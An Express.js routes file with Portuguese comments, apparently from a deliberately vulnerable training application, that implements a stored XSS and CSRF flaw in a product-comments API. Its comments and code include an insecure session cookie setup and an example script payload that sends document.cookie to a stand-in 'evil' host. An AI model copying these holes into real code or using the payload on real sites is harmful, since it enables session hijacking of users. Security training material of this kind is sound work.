// =====================================================================
// VULN-003  XSS STORED  +  CSRF (sem token, sem SameSite)
// CWE-79 (Stored XSS) + CWE-352 (CSRF)  |  OWASP A03/A01  |  CVSS 8.8 (High)
// ---------------------------------------------------------------------
// POST /api/comments
//   body: { product_id, author, body }
//   - aceita qualquer HTML/JS no campo `body`
//   - não exige CSRF token
//   - não valida origem (Origin/Referer)
//   - cookies session marcados como SameSite=None implicitamente
// GET /api/comments?product_id=1
//   - devolve HTML cru (renderizado pelo front) disparando o XSS Stored.
// Payload: {"product_id":1,"author":"mallory","body":"<script>fetch('//evil/?c='+document.cookie)</script>"}
// =====================================================================
const express = require('express');
const db = require('../db');
const router = express.Router();

router.post('/comments', (req, res) => {
  const { product_id, author, body } = req.body || {};
  // Sem validação, sem sanitização, sem token CSRF.
  const info = db
    .prepare('INSERT INTO comments (product_id, author, body) VALUES (?, ?, ?)')
    .run(product_id, author, body);

  // Cookie de sessão "fraco" para ilustrar CSRF + falta de SameSite
  res.cookie('vulnhub_sid', 's_' + Math.random().toString(36).slice(2), {
    httpOnly: false,          // CWE-1004
    sameSite: 'none',         // CWE-1275
    secure: false
  });
  res.json({ ok: true, id: info.lastInsertRowid });
});

router.get('/comments', (req, res) => {
  const rows = db
    .prepare('SELECT id, product_id, author, body, created_at FROM comments WHERE product_id = ? ORDER BY id DESC')
    .all(req.query.product_id || 0);
  // Devolve "body" bruto - qualquer cliente que renderizar com innerHTML detona o XSS stored.
  res.json(rows);
});

module.exports = router;
